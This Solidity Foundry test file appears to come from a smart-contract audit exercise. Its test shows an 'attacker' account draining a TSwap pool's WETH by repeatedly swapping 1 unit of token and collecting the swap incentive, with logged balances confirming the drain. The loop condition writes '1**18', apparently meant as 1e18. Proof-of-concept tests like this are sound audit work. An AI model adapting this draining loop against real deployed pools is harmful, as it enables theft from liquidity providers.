// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console } from "forge-std/Test.sol";
import { TSwapPool } from "../../src/PoolFactory.sol";
import { ERC20Mock } from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import { IERC20 } from "@openzeppelin/contracts/interfaces/IERC20.sol";

contract TSwapPoolTest is Test {
    TSwapPool pool;
    ERC20Mock poolToken;
    ERC20Mock weth;

    address liquidityProvider = makeAddr("liquidityProvider");
    address user = makeAddr("user");
    address attacker = makeAddr("attacker");

    function setUp() public {
        poolToken = new ERC20Mock();
        weth = new ERC20Mock();
        pool = new TSwapPool(address(poolToken), address(weth), "LTokenA", "LA");

        weth.mint(liquidityProvider, 200e18);
        poolToken.mint(liquidityProvider, 200e18);

        weth.mint(user, 200e18);
        poolToken.mint(user, 200e18);

        weth.mint(attacker, 200e18);
        poolToken.mint(attacker, 200e18);
    }

    function testSwapDrainIncentive() public {
        // initial deposit
        vm.startPrank(liquidityProvider);
        weth.approve(address(pool), 100e18);
        poolToken.approve(address(pool), 100e18);
        pool.deposit(10e18, 10e18, 10e18, uint64(block.timestamp));

        //
        vm.startPrank(attacker);
        weth.approve(address(pool), 200e18);
        poolToken.approve(address(pool), 200e18);

        console.log(weth.balanceOf(attacker)); // 200000000000000000000
        while(weth.balanceOf(address(pool)) > 1**18) {
            pool.swapExactInput(poolToken, 1, weth, 0, uint64(block.timestamp));
        }
        console.log(weth.balanceOf(attacker)); // 210000000000000000000
        console.log(weth.balanceOf(address(pool))); // 0
        console.log(poolToken.balanceOf(address(pool))); // 10000000000000000100

        assertLt(weth.balanceOf(address(pool)), 1);

    }
}
